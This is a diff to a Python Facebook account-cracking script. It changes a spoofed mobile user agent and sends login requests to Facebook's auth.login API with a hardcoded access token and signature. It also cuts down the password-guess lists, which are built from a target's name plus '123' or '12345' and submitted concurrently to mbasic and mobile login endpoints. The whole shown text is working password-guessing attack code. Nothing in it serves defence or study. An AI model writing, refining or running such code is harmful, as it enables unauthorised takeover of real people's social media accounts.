@@ -503,7 +503,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-	    ua_api = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'])
+	    ua_api = random.choice(['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile'])
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua_api,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             api = 'https://b-api.facebook.com/method/auth.login'
@@ -663,7 +663,7 @@ class __crack__:
                         xz = bb[1].split(' ')
                         if len(xz) == 1:
                             	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[0]+'123', xz[0]+'12345',
                         	]
                         elif len(xz) == 2:
                         	raimuuu = [
@@ -675,21 +675,6 @@ class __crack__:
                         		xz[0]+'123', xz[0]+'12345',
                         		xz[1]+'123', xz[1]+'12345',
                         		xz[2]+'123', xz[2]+'12345',
-                        	]
-                        elif len(xz) == 4:
-                        	raimuuu = [
-                        		xz[0]+'123', xz[0]+'12345',
-                        		xz[1]+'123', xz[1]+'12345',
-                        		xz[2]+'123', xz[2]+'12345',
-                        		xz[3]+'123', xz[3]+'12345',
-                        	]
-                        elif len(xz) == 5:
-                        	raimuuu = [
-                        		xz[0]+'123', xz[0]+'12345',
-                        		xz[1]+'123', xz[1]+'12345',
-                        		xz[2]+'123', xz[2]+'12345',
-                        		xz[3]+'123', xz[3]+'12345',
-                        		xz[4]+'123', xz[4]+'12345',
                         	]
                         __yayanXD__.submit(self.__mbasic__, bb[0], raimuuu)
                     except:
@@ -725,21 +710,6 @@ class __crack__:
                         		xz[0]+'123', xz[0]+'12345',
                         		xz[1]+'123', xz[1]+'12345',
                         		xz[2]+'123', xz[2]+'12345',
-                        	]
-                        elif len(xz) == 4:
-                        	raimuuu = [
-                        		xz[0]+'123', xz[0]+'12345',
-                        		xz[1]+'123', xz[1]+'12345',
-                        		xz[2]+'123', xz[2]+'12345',
-                        		xz[3]+'123', xz[3]+'12345',
-                        	]
-                        elif len(xz) == 5:
-                        	raimuuu = [
-                        		xz[0]+'123', xz[0]+'12345',
-                        		xz[1]+'123', xz[1]+'12345',
-                        		xz[2]+'123', xz[2]+'12345',
-                        		xz[3]+'123', xz[3]+'12345',
-                        		xz[4]+'123', xz[4]+'12345',
                         	]
                         __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
                     except:
